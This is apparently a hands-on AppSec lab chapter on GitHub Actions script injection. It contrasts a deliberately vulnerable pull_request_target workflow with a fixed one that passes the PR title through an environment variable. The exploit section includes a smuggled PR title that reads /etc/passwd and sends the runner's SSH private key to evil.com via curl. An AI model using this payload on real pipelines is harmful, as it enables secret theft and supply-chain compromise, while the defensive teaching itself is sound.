---
title: "05. Hands-On Vulnerability Lab"
description: "In this hands-on lab, you will audit a **vulnerable GitHub Actions workflow**, understand how a malicious Pull Request can execute script injection, a..."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "03 Cloud And Infra", "Cicd Pipeline Security", "05 Hands On Lab.Md"]
---

# 05. Hands-On Vulnerability Lab

In this hands-on lab, you will audit a **vulnerable GitHub Actions workflow**, understand how a malicious Pull Request can execute script injection, and refactor the workflow to be secure.

---

## 🧪 Lab Scenario

### Step 1: Vulnerable GitHub Actions Workflow (`vulnerable_workflow.yml`)

```yaml
# .github/workflows/vulnerable_pr_title.yml
name: PR Title Checker
on:
  pull_request_target: # VULNERABLE TRIGGER!

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - name: Print PR Title
        # VULNERABLE: Direct inline script injection of untrusted github.event.pull_request.title!
        run: |
          echo "PR Title is: ${{ github.event.pull_request.title }}"
```

### Exploit Mechanics:
An attacker submits a Pull Request with title:
`Feature"; cat /etc/passwd; curl -d @/home/runner/.ssh/id_rsa https://evil.com #`

When the workflow runs, the `run:` shell command expands to:
```bash
echo "PR Title is: Feature"; cat /etc/passwd; curl -d @/home/runner/.ssh/id_rsa https://evil.com #
```
Executing arbitrary commands under `pull_request_target` permissions!

---

### Step 2: Secure Fixed Workflow (`secure_workflow.yml`)

```yaml
# .github/workflows/secure_pr_title.yml
name: PR Title Checker
on:
  pull_request: # SECURE FIX 1: Safe trigger (Read-Only token, no secrets)

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - name: Print PR Title
        # SECURE FIX 2: Pass untrusted values as Environment Variables (prevents script injection!)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "PR Title is: $PR_TITLE"
```

---

*Next Chapter: [06. References & Tooling →](06-references.md)*
